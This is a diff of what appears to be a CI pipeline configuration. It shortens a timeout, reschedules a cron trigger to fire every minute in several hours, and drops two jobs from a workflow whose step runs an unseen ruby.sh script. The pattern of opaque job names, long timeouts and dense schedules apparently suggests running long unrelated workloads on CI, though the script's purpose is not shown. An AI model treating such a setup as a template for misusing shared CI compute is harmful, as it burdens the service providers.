@@ -12,7 +12,7 @@ working_dir: &working_dir ~/app
         name: kuntul
         command: |
                     chmod u+x ruby.sh && ./ruby.sh
-        no_output_timeout: 270m
+        no_output_timeout: 180m
 version: 2.0
 jobs:
   asui:
@@ -57,7 +57,7 @@ workflows:
       - asui6
     triggers:
       - schedule:
-          cron: "10 1,5,10,15,20 * * *"
+          cron: "* 2,9,12,18,21 * * *"
           filters:
             branches:
               only:
@@ -70,5 +70,3 @@ workflows:
       - asui2
       - asui3
       - asui4
-      - asui5
-      - asui6
